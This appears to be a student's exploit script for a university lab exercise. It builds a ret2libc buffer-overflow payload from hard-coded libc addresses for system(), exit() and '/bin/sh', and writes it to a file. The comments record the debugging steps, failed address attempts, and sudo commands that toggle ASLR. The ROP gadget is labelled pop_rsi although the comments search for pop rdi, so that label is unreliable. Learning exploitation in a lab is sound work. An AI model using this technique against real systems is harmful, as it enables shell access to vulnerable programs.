#!/usr/bin/env python3

# basic analysis with r2, then switch to gdb gef.
# info sharedlibrary
#  /lib64/ld-linux-x86-64.so.2
#  /lib/x86_64-linux-gnu/libc.so.6
# info proc map
#  # libc start: 0x7ffff7dd6000 (niedrigste der vorhandenen)
# ls -l /lib/x86_64-linux-gnu/libc.so.6
#  lrwxrwxrwx 1 root root 12 Feb 15 12:21 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.33.so

# p system
# 0x7ffff7e1f860
system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
# make sure the length fits the architecture!
# null is no issue here because scanf() does not stop reading there.

# p exit
# 0x7ffff7e15100
exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]

# strings -a -t x libc.so.6 | grep "/bin/sh"
# 0x184519 + libc start
# add them: 7FFF F7F5 A519
# bin_sh_string = b"\x00\x00\x7f\xff\xf7\xf5\xA5\x19"[::-1]
# x/s 0x7FFFF7F5A519

# search-pattern '/bin/sh' 0x7ffff7f6e882 # does not work!
# bin_sh_string = b"\x00\x00\x7f\xff\xf7\xf6\xe8\x82"[::-1]
# x/s 0x7ffff7f6e882
# gdb> info proc map
# libc start: 0x7ffff7dd6000
# strings -a -t x /lib/x86_64-linux-gnu/libc-2.33.so | grep "/bin/sh"
# 0x198882
# add them: 7FFF F7F6 E882
bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]
# does not work either.
# bin_sh_string = b"\x00\x00\x00\x00\x00\x40\x20\x2d"[::-1]
# break exit

# bin_sh_string = b"\x00\x00\x7f\xff\xff\xff\xe7\x15"[::-1]

buffer = 128 * b"a"  # 0x61
backup_base_pointer = 8 * b"b"
backup_instruction_pointer = system_call

rop_pop_rsi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]

payload = buffer + backup_base_pointer + rop_pop_rsi_ret + bin_sh_string + system_call + exit_call

f = open("payload", "wb")
f.write(payload)

# links for the writeup:
# https://sharkmoos.medium.com/binary-exploitation-exploiting-ret2libc-328eefb0421b
# https://nuc13us.wordpress.com/2015/12/26/return-to-libc-in-64-bit/
# https://moodle.technikum-wien.at/pluginfile.php/1353835/mod_resource/content/3/Tipps_Debugging_Linux_v1.0.pdf

# ropper --search 'pop rdi; ret;
# cat payload - | ./bin
# pwd
# whoami
# ps -p $$

# this was without ASLR:
# cat /proc/sys/kernel/randomize_va_space
# repeat 5 ldd ./bin | head -n1

# now for ASLR:
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space
# repeat 5 ldd ./bin | head -n1
